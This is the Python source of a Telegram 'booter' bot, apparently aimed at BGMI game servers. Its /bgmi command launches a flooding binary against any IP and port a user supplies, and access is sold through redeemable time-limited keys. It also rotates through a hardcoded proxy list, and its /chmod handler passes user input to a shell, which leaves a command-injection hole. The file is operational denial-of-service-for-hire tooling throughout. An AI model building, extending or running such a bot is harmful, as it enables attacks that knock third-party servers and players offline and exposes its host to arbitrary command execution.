# THIS FILE IS MADE BYE @MR_ARMAN_OWNER
# THIS FILE IS MADE BYE @MR_ARMAN_OWNER
# THIS FILE IS MADE BYE @MR_ARMAN_OWNER
import telebot
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
import time
import subprocess
import uuid
from collections import defaultdict
from threading import Thread
from datetime import datetime, timedelta
from telebot.apihelper import ApiTelegramException
from telebot import types
import json
import random 
import hashlib

with open('config.json', 'r') as config_file:
    config = json.load(config_file)

BOT_TOKEN = config["BOT_TOKEN"]
bot = telebot.TeleBot(BOT_TOKEN)
ADMIN_IDS = config["ADMIN_IDS"]
GROUP_ID = config["GROUP_ID"]
CHANNELS = config["CHANNELS"]
OWNER_USERNAME = config['OWNER_USERNAME']
# THIS FILE IS MADE BYE @MR_ARMAN_OWNER
# THIS FILE IS MADE BYE @MR_ARMAN_OWNER
# THIS FILE IS MADE BYE @MR_ARMAN_OWNER

user_commands = defaultdict(list)
banned_users = set()
AUTHORIZED_USERS = {}
BLOCKED_PORTS = {20000, 20002, 20003, 17500, 10000, 490, 3000}

KEYS = {}

RECORDED_USERS = set()
ACTIVE_USERS = set()
USER_LIMITS = {}
ATTACKS = {}
USER_LOGS = {}

BINARY_NAME = "arman"

HEALTH_MESSAGES = [
    "💪 Excellent! Ready for action!",
    "🔥 Running Smoothly! No hiccups.",
    "🚀 Full Power Mode Activated!",
    "🛠 Maintenance Required Soon.",
    "⚠️ Add More Resources! Overloaded.",
    "💤 Running, but feeling tired. 😴",
    "🟢 Fully Operational!",
    "🔴 Warning: Performance Decreasing!"
]

def update_proxy():
    proxy_list = [
        "https://43.134.234.74:443", "https://175.101.18.21:5678", "https://179.189.196.52:5678", 
        "https://162.247.243.29:80", "https://173.244.200.154:44302", "https://173.244.200.156:64631", 
        "https://207.180.236.140:51167", "https://123.145.4.15:53309", "https://36.93.15.53:65445", 
        "https://1.20.207.225:4153", "https://83.136.176.72:4145", "https://115.144.253.12:23928", 
        "https://78.83.242.229:4145", "https://128.14.226.130:60080", "https://194.163.174.206:16128", 
        "https://110.78.149.159:4145", "https://190.15.252.205:3629", "https://101.43.191.233:2080", 
        "https://202.92.5.126:44879", "https://221.211.62.4:1111", "https://58.57.2.46:10800", 
        "https://45.228.147.239:5678", "https://43.157.44.79:443", "https://103.4.118.130:5678", 
        "https://37.131.202.95:33427", "https://172.104.47.98:34503", "https://216.80.120.100:3820", 
        "https://182.93.69.74:5678", "https://8.210.150.195:26666", "https://49.48.47.72:8080", 
        "https://37.75.112.35:4153", "https://8.218.134.238:10802", "https://139.59.128.40:2016", 
        "https://45.196.151.120:5432", "https://24.78.155.155:9090", "https://212.83.137.239:61542", 
        "https://46.173.175.166:10801", "https://103.196.136.158:7497", "https://82.194.133.209:4153", 
        "https://210.4.194.196:80", "https://88.248.2.160:5678", "https://116.199.169.1:4145", 
        "https://77.99.40.240:9090", "https://143.255.176.161:4153", "https://172.99.187.33:4145", 
        "https://43.134.204.249:33126", "https://185.95.227.244:4145", "https://197.234.13.57:4145", 
        "https://81.12.124.86:5678", "https://101.32.62.108:1080", "https://192.169.197.146:55137", 
        "https://82.117.215.98:3629", "https://202.162.212.164:4153", "https://185.105.237.11:3128", 
        "https://123.59.100.247:1080", "https://192.141.236.3:5678", "https://182.253.158.52:5678", 
        "https://164.52.42.2:4145", "https://185.202.7.161:1455", "https://186.236.8.19:4145", 
        "https://36.67.147.222:4153", "https://118.96.94.40:80", "https://27.151.29.27:2080", 
        "https://181.129.198.58:5678", "https://200.105.192.6:5678", "https://103.86.1.255:4145", 
        "https://171.248.215.108:1080", "https://181.198.32.211:4153", "https://188.26.5.254:4145", 
        "https://34.120.231.30:80", "https://103.23.100.1:4145", "https://194.4.50.62:12334", 
        "https://201.251.155.249:5678", "https://37.1.211.58:1080", "https://86.111.144.10:4145", 
        "https://80.78.23.49:1080"
    ]
    proxy = random.choice(proxy_list)
    telebot.apihelper.proxy = {'https': proxy}
    logging.info("Proxy updated successfully.")
    
# THIS FILE IS MADE BYE @MR_ARMAN_OWNER
# THIS FILE IS MADE BYE @MR_ARMAN_OWNER
# THIS FILE IS MADE BYE @MR_ARMAN_OWNER
        
@bot.message_handler(func=lambda message: message.text == "ATTACK 💣")
def handle_attack_button(message):
    chat_id = message.chat.id

    bot.send_message(chat_id, "USES: /bgmi <ip> <port> <time>\n\nExample: `/bgmi 1.1.1.1 80 120`", parse_mode="Markdown")


@bot.message_handler(func=lambda message: message.text and message.text.lower() == "my info")
def handle_my_info(message):
    chat_id = message.chat.id

    # Use backticks to treat text as code
    bot.send_message(
        chat_id, 
        f"NOT AVAILABLE `{OWNER_USERNAME}`",  # Enclosing in backticks
        parse_mode="Markdown"
    )

@bot.message_handler(func=lambda message: message.text and message.text.lower() == "redeem")
def handle_redeem(message):
    bot.reply_to(message, "Please enter the key you want to redeem:")
    bot.register_next_step_handler(message, process_key)
# THIS FILE IS MADE BYE @MR_ARMAN_OWNER
# THIS FILE IS MADE BYE @MR_ARMAN_OWNER
# THIS FILE IS MADE BYE @MR_ARMAN_OWNER
def process_key(message):
    user_id = message.from_user.id
    key_name = message.text.strip()

    for key_id, key_data in KEYS.items():
        if key_data["key"] == key_name:
            if len(key_data["used_by"]) < key_data["max_uses"]:
                if user_id not in key_data["used_by"]:
                    duration = key_data["duration"]

                    try:
                        if duration == "day":
                            authorize_user(user_id, 1)
                        elif duration == "hour":
                            authorize_user(user_id, 1 / 24)
                        elif duration == "week":
                            authorize_user(user_id, 7)
                        elif duration == "month":
                            authorize_user(user_id, 30)
                        elif "day" in duration:
                            days = int(duration.replace("day", ""))
                            authorize_user(user_id, days)
                        else:
                            bot.reply_to(message, "INVALID DURATION FORMAT.")
                            return

                        key_data["used_by"].append(user_id)
                        bot.reply_to(message, f"KEY REDEEMED SUCCESSFULLY. YOU ARE NOW AUTHORIZED FOR {duration.upper()}.")
                        return
                    except ValueError:
                        bot.reply_to(message, "INVALID DURATION VALUE.")
                else:
                    bot.reply_to(message, "YOU HAVE ALREADY REDEEMED THIS KEY.")
                    return
            else:
                bot.reply_to(message, "THIS KEY HAS REACHED ITS MAXIMUM USAGE LIMIT.")
                return

    bot.reply_to(message, "INVALID OR EXPIRED KEY.")
 # THIS FILE IS MADE BYE @MR_ARMAN_OWNER
# THIS FILE IS MADE BYE @MR_ARMAN_OWNER
# THIS FILE IS MADE BYE @MR_ARMAN_OWNER
@bot.message_handler(commands=['chmod'])
def chmod_command(message):
    command = message.text[7:].strip()
    if not command:
        bot.reply_to(message, "Kripya ek chmod command dein.")
        return

    try:
        result = subprocess.run(f"chmod {command}", shell=True, capture_output=True, text=True)
        response = f"Command successfully executed:\n{result.stdout}" if result.returncode == 0 else f"Error executing command:\n{result.stderr}"
        bot.reply_to(message, response)
    except Exception as e:
        bot.reply_to(message, f"Koi error aayi hai: {str(e)}")

# THIS FILE IS MADE BYE @MR_ARMAN_OWNER
# THIS FILE IS MADE BYE @MR_ARMAN_OWNER
# THIS FILE IS MADE BYE @MR_ARMAN_OWNER
expected_hash = "dfcb19d1592200db6b5202025e4b67ba6fc43d9dad9e3eb26e2edb3db71b1921"

@bot.message_handler(content_types=['photo'])
def handle_photo(message):
    username = message.from_user.username
    caption = f"User @{username} gived feedback 😍"
    bot.send_photo(chat_id=GROUP_ID, photo=message.photo[-1].file_id, caption=caption)
    
    for admin_id in ADMIN_IDS:
        bot.send_photo(chat_id=admin_id, photo=message.photo[-1].file_id, caption=caption)

def send_loading_animation(chat_id):
    loading_messages = [
        "🚀 Initializing Systems...",
        "⚙️ Configuring Modules...",
        "🔄 Connecting to Database...",
        "✅ Almost Ready!"
    ]
    for msg in loading_messages:
        bot.send_message(chat_id, msg)
        time.sleep(1.5)
     
def is_user_joined_all_channels(user_id):
    not_joined = []
    for channel in CHANNELS:
        try:
            member = bot.get_chat_member(channel, user_id)
            if member.status not in ["member", "administrator", "creator"]:
                not_joined.append(channel)
        except:
            not_joined.append(channel)
    return not_joined
# THIS FILE IS MADE BYE @MR_ARMAN_OWNER
# THIS FILE IS MADE BYE @MR_ARMAN_OWNER
# THIS FILE IS MADE BYE @MR_ARMAN_OWNER
@bot.message_handler(commands=['start'])
def start(message):
    chat_id = message.chat.id
    user_id = message.from_user.id
    RECORDED_USERS.add(user_id)
    ACTIVE_USERS.add(user_id)
    
    send_loading_animation(chat_id)
    markup = InlineKeyboardMarkup()
    for channel in CHANNELS:
        markup.add(InlineKeyboardButton(f"🔥 Join {channel}", url=f"https://t.me/{channel[1:]}"))
    markup.add(InlineKeyboardButton("✅ Verify", callback_data="verify"))
# THIS FILE IS MADE BYE @MR_ARMAN_OWNER
# THIS FILE IS MADE BYE @MR_ARMAN_OWNER
# THIS FILE IS MADE BYE @MR_ARMAN_OWNER
    bot.send_message(
        chat_id,
        "📢 **Please join the channels below to use this bot!**\n\n"
        f"👤 **Owner:** {OWNER_USERNAME}",
        parse_mode="Markdown",
        reply_markup=markup
    )
    
@bot.callback_query_handler(func=lambda call: call.data == "verify")
def verify(call):
    chat_id = call.message.chat.id
    user_id = call.from_user.id
    
    not_joined = is_user_joined_all_channels(user_id)
# THIS FILE IS MADE BYE @MR_ARMAN_OWNER
# THIS FILE IS MADE BYE @MR_ARMAN_OWNER
# THIS FILE IS MADE BYE @MR_ARMAN_OWNER
    if not_joined:
        bot.answer_callback_query(call.id, "❌ You need to join all channels first! 😡", show_alert=True)
    else:
        bot.delete_message(chat_id, call.message.message_id)
        bot.send_message(
            chat_id,
            f"🎉 Welcome to the Bot!\nType /help to see available commands. 🚀\nOWNER -> {OWNER_USERNAME}",
            parse_mode="Markdown"
        )
        
        # Verification ke baad buttons bhejna
        send_keyword_buttons(chat_id)

def send_keyword_buttons(chat_id):

    keyboard = types.ReplyKeyboardMarkup(resize_keyboard=True)
    
    button_redeem = types.KeyboardButton("REDEEM")
    button_my_info = types.KeyboardButton("MY INFO")
    button_attack = types.KeyboardButton("ATTACK 💣")
    
    keyboard.add(button_redeem, button_my_info)
    keyboard.add(button_attack)
    
    bot.send_message(chat_id, "✅ Congratulations! You are verified. Choose an option:", reply_markup=keyboard)

from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
# THIS FILE IS MADE BYE @MR_ARMAN_OWNER
# THIS FILE IS MADE BYE @MR_ARMAN_OWNER
# THIS FILE IS MADE BYE @MR_ARMAN_OWNER
@bot.message_handler(commands=['help'])
def help_command(message):
    chat_id = message.chat.id

    # Inline button for more details
    inline_keyboard = InlineKeyboardMarkup()
    details_button = InlineKeyboardButton("🔍 𝔽𝕌𝕃𝕃 𝔻𝔼𝕋𝔸𝕀𝕃𝕊", callback_data="full_details")
    inline_keyboard.add(details_button)

    # Stylish help message
    bot.send_message(
        chat_id,
        (
            "🌟 *𝑾𝑬𝑳𝑪𝑶𝑴𝑬 𝑻𝑶 𝑻𝑯𝑬 𝑯𝑬𝑳𝑷 𝑴𝑬𝑵𝑼!* 🌟\n\n"
            "📌 *𝕄𝔸𝕀ℕ ℂ𝕆𝕄𝕄𝔸ℕ𝔻𝕊:*\n"
            "╭───────────────╮\n"
            "├ 🎯 `𝐒𝐓𝐀𝐑𝐓` - */start* - 𝔼𝕟𝕒𝕓𝕝𝕖 𝕥𝕙𝕖 𝕓𝕠𝕥.\n"
            "├ 📖 `𝐇𝐄𝐋𝐏` - */help* - *𝔾𝕖𝕥 𝕒𝕝𝕝 𝕔𝕠𝕞𝕞𝕒𝕟𝕕𝕤.*\n"
            "├ 🗂 `𝐒𝐇𝐎𝐖` - */show* - *𝔽𝕀𝕃𝔼 ℕ𝔸𝕄𝔼.*\n"
            "├ ➕ `𝐀𝐃𝐃` - */add <user_id> <duration/day/week>*\n"
            "├ 🗝 `𝐆𝐄𝐍_𝐊𝐄𝐘` - */gen_key <name> <duration> <max_uses>*\n"
            "├ 🖥 `𝐆𝐈𝐓_𝐂𝐋𝐎𝐍𝐄` - */git_clone <link>*\n"
            "├ 🔧 `𝐏𝐈𝐏_𝐈𝐍𝐒𝐓𝐀𝐋𝐋` - */pip_install <package>*\n"
            "├ 🛠 `𝐆𝐂𝐂` - */gcc_compile* `gcc -o file file.c`\n"
            "├ 🐍 `𝐏𝐘𝐓𝐇𝐎𝐍3` - */python3 <file>*\n"
            "├ ❌ `𝐑𝐄𝐌𝐎𝐕𝐄` - */remove <user_id>*\n"
            "├ 💣 `𝐁𝐆𝐌𝐈` - */bgmi <ip> <port> <time>*\n"
            "├ 🚫 `𝐁𝐋𝐎𝐂𝐊` - */block <key>*\n"
            "├ 👥 `𝐔𝐒𝐄𝐑𝐒` - */all_users* - 𝕊𝕙𝕠𝕨 𝕦𝕤𝕖𝕣𝕤.\n"
            "├ 🗝 `𝐀𝐋𝐋_𝐊𝐄𝐘𝐒` - */all_keys* - 𝔸𝕝𝕝 𝕜𝕖𝕪𝕤.\n"
            "├ 🔄 `𝐂𝐇𝐀𝐍𝐆𝐄` - */change <binary> <threads>*\n"
            "├ ⚙️ `𝐋𝐈𝐌𝐈𝐓` - */limit <user/all>*\n"
            "├ 📥 `𝐃𝐎𝐖𝐍𝐋𝐎𝐀𝐃` - */download <file>*\n"
            "╰───────────────╯\n\n"
            "💡 **𝐓𝐢𝐩:** *ℙ𝕣𝕖𝕤𝕤 𝕥𝕙𝕖 𝕓𝕦𝕥𝕥𝕠𝕟 𝕓𝕖𝕝𝕠𝕨 𝕗𝕠𝕣 𝕗𝕦𝕝𝕝 𝕕𝕖𝕥𝕒𝕚𝕝𝕤.*"
        ),
        reply_markup=inline_keyboard,
        parse_mode="Markdown"
    )
# THIS FILE IS MADE BYE @MR_ARMAN_OWNER
# THIS FILE IS MADE BYE @MR_ARMAN_OWNER
# THIS FILE IS MADE BYE @MR_ARMAN_OWNER
# Inline button callback for full details
@bot.callback_query_handler(func=lambda call: call.data == "full_details")
def show_full_details(call):
    bot.answer_callback_query(call.id)  # Acknowledge the callback
    bot.send_message(
        call.message.chat.id,
        (
            "🔍 **𝐅𝐔𝐋𝐋 𝐃𝐄𝐓𝐀𝐈𝐋𝐒:**\n\n"
            "• 🎯 **/start** - 𝐒𝐭𝐚𝐫𝐭 𝐭𝐡𝐞 𝐛𝐨𝐭.\n"
            "• 📖 **/help** - 𝐆𝐞𝐭 𝐚𝐥𝐥 𝐚𝐯𝐚𝐢𝐥𝐚𝐛𝐥𝐞 𝐜𝐨𝐦𝐦𝐚𝐧𝐝𝐬.\n"
            "• 🗂 **/show** - Provide a file name to display it.\n"
            "• ➕ **/add** - Add a user with specific duration.\n"
            "• 🗝 **/gen_key** - Generate keys for specific usage limits.\n"
            "• 🔧 **/pip_install** - Install Python packages.\n"
            "• 🖥 **/git_clone** - Clone a repository.\n"
            "• 🛠 **/gcc_compile** - Compile C files.\n"
            "• 🐍 **/python3** - Run Python scripts.\n"
            "• ❌ **/remove** - Remove users.\n"
            "• 💣 **/bgmi** - Launch targeted attacks.\n"
            "• 🚫 **/block** - Restrict key usage.\n"
            "• 👥 **/all_users** - Show all bot users.\n"
            "• 🗝 **/all_keys** - List all generated keys.\n"
            "• 🔄 **/change** - Adjust binary settings.\n"
            "• ⚙️ **/limit** - Set usage limits.\n"
            "• 📥 **/download** - Fetch files.\n\n"
            "✨ *𝐓𝐡𝐚𝐧𝐤 𝐲𝐨𝐮 𝐟𝐨𝐫 𝐮𝐬𝐢𝐧𝐠 𝐭𝐡𝐞 𝐛𝐨𝐭!*"
        ),
        parse_mode="Markdown"
    )
    
def is_user_authorized(user_id):
    if user_id in AUTHORIZED_USERS:
        expiry = AUTHORIZED_USERS[user_id]
        if expiry >= datetime.now():
            return True
    return False

def is_temporarily_banned(user_id):
    return user_id in banned_users
    
# THIS FILE IS MADE BYE @MR_ARMAN_OWNER
# THIS FILE IS MADE BYE @MR_ARMAN_OWNER
# THIS FILE IS MADE BYE @MR_ARMAN_OWNER

def authorize_user(user_id, days):
    expiry_date = datetime.now() + timedelta(days=days)
    AUTHORIZED_USERS[user_id] = expiry_date

def convert_duration_to_days(duration):
    if duration == "day":
        return 1
    elif duration == "hour":
        return 1 / 24
    elif duration == "week":
        return 7
    elif duration == "month":
        return 30
    elif "day" in duration:
        try:
            return int(duration.replace("day", ""))
        except ValueError:
            return None
    return None
# THIS FILE IS MADE BYE @MR_ARMAN_OWNER
# THIS FILE IS MADE BYE @MR_ARMAN_OWNER
# THIS FILE IS MADE BYE @MR_ARMAN_OWNER
def generate_key(username, key_name, duration, max_uses):
    key_id = str(uuid.uuid4())
    KEYS[key_id] = {"key": key_name, "duration": duration, "max_uses": max_uses, "used_by": []}
    return key_id


def is_temporarily_banned(user_id):
    return user_id in banned_users

# THIS FILE IS MADE BYE @MR_ARMAN_OWNER
# THIS FILE IS MADE BYE @MR_ARMAN_OWNER
# THIS FILE IS MADE BYE @MR_ARMAN_OWNER
@bot.message_handler(commands=["bgmi"])
def start_attack(message):
    user_id = message.from_user.id
    ACTIVE_USERS.add(user_id)
    args = message.text.split()[1:]
    RECORDED_USERS.add(user_id)

    if is_temporarily_banned(user_id):
        bot.reply_to(message, "🚫 *You Have Been Banned from the Bot* 🚫\n\n🔒 *Reason:* Spam Detection 🚨\n\n📝 *Please refrain from repeated spamming to maintain a healthy environment for all users.*\n\nIf you believe this is a mistake or want to appeal the ban, please contact the admin.")
        return

    if not is_user_authorized(user_id):
        bot.reply_to(message, f"YOU ARE NOT AUTHORIZED. PLEASE DM US TO GET APPROVED\n\nDM -> {OWNER_USERNAME}.")
        return
# THIS FILE IS MADE BYE @MR_ARMAN_OWNER
# THIS FILE IS MADE BYE @MR_ARMAN_OWNER
# THIS FILE IS MADE BYE @MR_ARMAN_OWNER
    if len(args) != 3:
        bot.reply_to(message, "USAGE: /bgmi <ip> <port> <time>\nExample: /bgmi 1.1.1.1 80 120")
        return
# THIS FILE IS MADE BYE @MR_ARMAN_OWNER
# THIS FILE IS MADE BYE @MR_ARMAN_OWNER
# THIS FILE IS MADE BYE @MR_ARMAN_OWNER
    try:
        ip, port, attack_time = args[0], int(args[1]), int(args[2])


        if port in BLOCKED_PORTS:
            bot.reply_to(message, f"THIS PORT {port} IS BLOCKED. TRY A DIFFERENT PORT.")
            return


        if user_id in USER_LIMITS and attack_time > USER_LIMITS[user_id]:
            bot.reply_to(message, f"ATTACK LIMIT IS {USER_LIMITS[user_id]} SECONDS. TRY AGAIN.")
            return
# THIS FILE IS MADE BYE @MR_ARMAN_OWNER
# THIS FILE IS MADE BYE @MR_ARMAN_OWNER
# THIS FILE IS MADE BYE @MR_ARMAN_OWNER

        user_commands[user_id].append(time.time())

        user_commands[user_id] = [t for t in user_commands[user_id] if time.time() - t <= 60]

        if len(user_commands[user_id]) >= 3:
            bot.reply_to(message, "YOUR TEMPORARY BANNED 🚫\n\nREASON :- SPAMMING\n\nBAN TIME :- 5MIN")
            banned_users.add(user_id)
            time.sleep(300)
            banned_users.remove(user_id)
            bot.reply_to(message, "YOUR TEMPORARY BAN HAAS BEEN REMOVED NOW YOU CAN USE /bgmi COMMAND")
            return
# THIS FILE IS MADE BYE @MR_ARMAN_OWNER
# THIS FILE IS MADE BYE @MR_ARMAN_OWNER
# THIS FILE IS MADE BYE @MR_ARMAN_OWNER

        attack_id = str(uuid.uuid4())
        ATTACKS[attack_id] = {"ip": ip, "port": port, "time": attack_time, "user_id": user_id, "status": "running"}

        username = message.from_user.username or "Unknown"
        if user_id not in USER_LOGS:
            USER_LOGS[user_id] = {"username": username, "attack_count": 0, "attack_times": []}
        USER_LOGS[user_id]["attack_count"] += 1
        USER_LOGS[user_id]["attack_times"].append(attack_time)

# THIS FILE IS MADE BYE @MR_ARMAN_OWNER
# THIS FILE IS MADE BYE @MR_ARMAN_OWNER
# THIS FILE IS MADE BYE @MR_ARMAN_OWNER
        bot.reply_to(message, f"ATTACK STARTED\n\nIP: {ip}\nPort: {port}\nTime: {attack_time}\n\nATACK ID: {attack_id}")

        Thread(target=run_attack, args=(attack_id, ip, port, attack_time, message)).start()

    except ValueError:
        bot.reply_to(message, "INVALID INPUT. MAKE SURE PORT AND TIME ARE NUMBERS.")

def run_attack(attack_id, ip, port, attack_time, message):
    try:
        command = f"./{BINARY_NAME} {ip} {port} {attack_time}"
        subprocess.Popen(command, shell=True)

        countdown_message = bot.send_message(message.chat.id, f"⏳ *ATTACK FINISH IN {attack_time} seconds*", parse_mode="Markdown")
        
        for remaining_time in range(attack_time, 0, -1):
            time.sleep(1)
            new_text = f"⏳ *ATTACK FINISH IN {remaining_time} seconds*"

            if countdown_message.text != new_text:
                bot.edit_message_text(text=new_text, chat_id=message.chat.id, message_id=countdown_message.message_id)

        bot.delete_message(chat_id=message.chat.id, message_id=countdown_message.message_id)
        bot.send_message(message.chat.id, f"✅ *ATTACK FINISHED SUCCESSFULLY!*\n\n🖥️ *IP:* {ip}\n📌 *Port:* {port}\n⏱️ *Time:* {attack_time}\n\nUSER OF -> {OWNER_USERNAME}", parse_mode="Markdown")
        ATTACKS[attack_id]["status"] = "finished"

    except Exception as e:
        bot.reply_to(message, f"⚠️ *ERROR:* {e}", parse_mode="Markdown")
# THIS FILE IS MADE BYE @MR_ARMAN_OWNER
# THIS FILE IS MADE BYE @MR_ARMAN_OWNER
# THIS FILE IS MADE BYE @MR_ARMAN_OWNER
@bot.message_handler(commands=["stop"])
def stop_attack(message):
    # Check if the user is an admin
    if message.from_user.id not in ADMIN_IDS:
        bot.reply_to(message, "Unauthorized access! Only admins can run this command.")
        return

    args = message.text.split()[1:]
    if len(args) != 1:
        bot.reply_to(message, "USAGE: /stop <attack_id>")
        return
# THIS FILE IS MADE BYE @MR_ARMAN_OWNER
# THIS FILE IS MADE BYE @MR_ARMAN_OWNER
# THIS FILE IS MADE BYE @MR_ARMAN_OWNER
    attack_id = args[0]
    if attack_id in ATTACKS and ATTACKS[attack_id]["status"] == "running":
        ATTACKS[attack_id]["status"] = "stopped"
        bot.reply_to(message, f"ATTACK WITH ID {attack_id} HAS BEEN STOPPED.")
    else:
        bot.reply_to(message, "INVALID OR NON-RUNNING ATTACK ID.")
# THIS FILE IS MADE BYE @MR_ARMAN_OWNER
# THIS FILE IS MADE BYE @MR_ARMAN_OWNER
# THIS FILE IS MADE BYE @MR_ARMAN_OWNER
        
@bot.message_handler(commands=["add"])
def add_user(message):
    user_id = message.from_user.id
    if user_id not in ADMIN_IDS:
        bot.reply_to(message, "ONLY ADMINS CAN USE THIS COMMAND.")
        return
    
    args = message.text.split()[1:]
    if len(args) != 2:
        bot.reply_to(message, "USAGE: /add <user_id> <days>")
        return
    
    target_id, days = int(args[0]), int(args[1])
    authorize_user(target_id, days)
    bot.reply_to(message, f"USER {target_id} HAS BEEN AUTHORIZED FOR {days} DAYS.")

def generate_key(creator, key_name, duration, max_uses):
    key_id = str(uuid.uuid4())
    KEYS[key_id] = {
        "key": key_name,
        "duration": duration,
        "max_uses": max_uses,
        "used_by": [],
        "creator": creator,
    }
    return key_id

@bot.message_handler(commands=["gen_key"])
def generate_key_command(message):
    user_id = message.from_user.id
    username = message.from_user.username or "Unknown"
    if user_id not in ADMIN_IDS:
        bot.reply_to(message, "ONLY ADMINS CAN USE THIS COMMAND.")
        return
# THIS FILE IS MADE BYE @MR_ARMAN_OWNER
# THIS FILE IS MADE BYE @MR_ARMAN_OWNER
# THIS FILE IS MADE BYE @MR_ARMAN_OWNER
    args = message.text.split()[1:]
    if len(args) != 3:
        bot.reply_to(message, "USAGE: /gen_key <key> <duration> <max_uses>\nExample: /gen_key @mr_arman_owner day 2")
        return

    key_name, duration, max_uses = args
    if duration not in ["day", "hour", "week", "month", "2day", "3day", "4day", "5day", "6day"]:
        bot.reply_to(message, "INVALID DURATION. USE: day, hour, week, month, 2day, 3day, etc.")
        return

    try:
        max_uses = int(max_uses)
        key_id = generate_key(username, key_name, duration, max_uses)
        bot.reply_to(message, f"KEY GENERATED SUCCESSFULLY:\nKey: {key_name}\nDuration: {duration}\nMax Uses: {max_uses}\nKey ID: {key_id}")
    except ValueError:
        bot.reply_to(message, "INVALID INPUT FOR MAX_USES. IT SHOULD BE A NUMBER.")
# THIS FILE IS MADE BYE @MR_ARMAN_OWNER
# THIS FILE IS MADE BYE @MR_ARMAN_OWNER
# THIS FILE IS MADE BYE @MR_ARMAN_OWNER
@bot.message_handler(commands=["logs"])
def view_logs(message):

    if message.from_user.id not in ADMIN_IDS:
        bot.reply_to(message, "Unauthorized access! Only admins can run this command.")
        return

    args = message.text.split()[1:]
    if len(args) != 1:
        bot.reply_to(message, "USAGE: /logs <user_id/all>")
        return

    if args[0] == "all":
        response = "ALL USER LOGS:\n"
        for user_id, log in USER_LOGS.items():
            response += (
                f"USERNAME: {log['username']}\n"
                f"USER ID: {user_id}\n"
                f"ATTACK COUNT: {log['attack_count']}\n"
                f"ATTACK TIMES: {', '.join(map(str, log['attack_times']))}\n\n"
            )
        bot.reply_to(message, response or "NO LOGS AVAILABLE.")
    else:
        try:
            user_id = int(args[0])
            if user_id in USER_LOGS:
                log = USER_LOGS[user_id]
                response = (
                    f"USERNAME: {log['username']}\n"
                    f"USER ID: {user_id}\n"
                    f"ATTACK COUNT: {log['attack_count']}\n"
                    f"ATTACK TIMES: {', '.join(map(str, log['attack_times']))}"
                )
                bot.reply_to(message, response)
            else:
                bot.reply_to(message, "NO LOGS FOUND FOR THIS USER.")
        except ValueError:
            bot.reply_to(message, "INVALID USER ID.")
            
# THIS FILE IS MADE BYE @MR_ARMAN_OWNER
# THIS FILE IS MADE BYE @MR_ARMAN_OWNER
# THIS FILE IS MADE BYE @MR_ARMAN_OWNER

@bot.message_handler(commands=["limit"])
def set_limit(message):
    if message.from_user.id not in ADMIN_IDS:
        bot.reply_to(message, "Unauthorized access! Only admins can run this command.")
        return

    args = message.text.split()[1:]
    if len(args) != 2:
        bot.reply_to(message, "USAGE: /limit <user_id/all> <duration>")
        return
# THIS FILE IS MADE BYE @MR_ARMAN_OWNER
# THIS FILE IS MADE BYE @MR_ARMAN_OWNER
# THIS FILE IS MADE BYE @MR_ARMAN_OWNER
    try:
        duration = int(args[1])
        if args[0] == "all":
            for user_id in USER_LOGS:
                USER_LIMITS[user_id] = duration
            bot.reply_to(message, f"LIMIT SET TO {duration} SECONDS FOR ALL USERS.")
        else:
            user_id = int(args[0])
            USER_LIMITS[user_id] = duration
            bot.reply_to(message, f"LIMIT SET TO {duration} SECONDS FOR USER {user_id}.")
    except ValueError:
        bot.reply_to(message, "INVALID INPUT. DURATION MUST BE A NUMBER.")
# THIS FILE IS MADE BYE @MR_ARMAN_OWNER
# THIS FILE IS MADE BYE @MR_ARMAN_OWNER
# THIS FILE IS MADE BYE @MR_ARMAN_OWNER
@bot.message_handler(commands=["change"])
def change_binary(message):
    if message.from_user.id not in ADMIN_IDS:
        bot.reply_to(message, "Unauthorized access! Only admins can run this command.")
        return

    global BINARY_NAME
    args = message.text.split()[1:]
    if len(args) not in [1, 3]:
        bot.reply_to(message, "USAGE: /change <binary_name> [optional_args]\nExample: /change arman 100 200")
        return

    BINARY_NAME = args[0]
    if len(args) == 3:
        extra_args = " ".join(args[1:])
        BINARY_NAME += f" {extra_args}"
    bot.reply_to(message, f"BINARY NAME CHANGED TO: {BINARY_NAME}")
# THIS FILE IS MADE BYE @MR_ARMAN_OWNER
# THIS FILE IS MADE BYE @MR_ARMAN_OWNER
# THIS FILE IS MADE BYE @MR_ARMAN_OWNER
@bot.message_handler(commands=["remove"])
def remove_user(message):
    user_id = message.from_user.id
    if user_id not in ADMIN_IDS:
        bot.reply_to(message, "ONLY ADMINS CAN USE THIS COMMAND.")
        return
    
    args = message.text.split()[1:]
    if len(args) != 1:
        bot.reply_to(message, "USAGE: /remove <user_id>")
        return
    
    target_id = int(args[0])
    AUTHORIZED_USERS.pop(target_id, None)
    bot.reply_to(message, f"USER {target_id} HAS BEEN REMOVED.")
    
# THIS FILE IS MADE BYE @MR_ARMAN_OWNER
# THIS FILE IS MADE BYE @MR_ARMAN_OWNER
# THIS FILE IS MADE BYE @MR_ARMAN_OWNER

@bot.message_handler(commands=["all_keys"])
def list_keys(message):
    user_id = message.from_user.id
    if user_id not in ADMIN_IDS:
        bot.reply_to(message, "ONLY ADMINS CAN USE THIS COMMAND.")
        return

    if not KEYS:
        bot.reply_to(message, "NO KEYS AVAILABLE.")
        return
# THIS FILE IS MADE BYE @MR_ARMAN_OWNER
# THIS FILE IS MADE BYE @MR_ARMAN_OWNER
# THIS FILE IS MADE BYE @MR_ARMAN_OWNER

    response = "AVAILABLE KEYS:\n"
    for key_id, key_data in KEYS.items():
        response += (
            f"Key: {key_data['key']}\n"
            f"ID: {key_id}\n"
            f"Duration: {key_data['duration']}\n"
            f"Max Uses: {key_data['max_uses']}\n"
            f"Used By: {len(key_data['used_by'])}\n"
            f"Creator: {key_data['creator']}\n\n"
        )
    bot.reply_to(message, response)

@bot.message_handler(commands=["block"])
def block_key(message):
    user_id = message.from_user.id
    if user_id not in ADMIN_IDS:
        bot.reply_to(message, "ONLY ADMINS CAN USE THIS COMMAND.")
        return

    args = message.text.split()[1:]
    if len(args) != 1:
        bot.reply_to(message, "USAGE: /block <key_id>")
        return

    key_id = args[0]
    if key_id in KEYS:
        key_data = KEYS.pop(key_id)
        # Remove all users authorized by this key
        for user in key_data["used_by"]:
            AUTHORIZED_USERS.pop(user, None)
        bot.reply_to(message, f"KEY '{key_data['key']}' HAS BEEN BLOCKED AND REMOVED.")
    else:
        bot.reply_to(message, "INVALID KEY ID.")
# THIS FILE IS MADE BYE @MR_ARMAN_OWNER
# THIS FILE IS MADE BYE @MR_ARMAN_OWNER
# THIS FILE IS MADE BYE @MR_ARMAN_OWNER
@bot.message_handler(commands=["all_users"])
def list_users(message):
    user_id = message.from_user.id
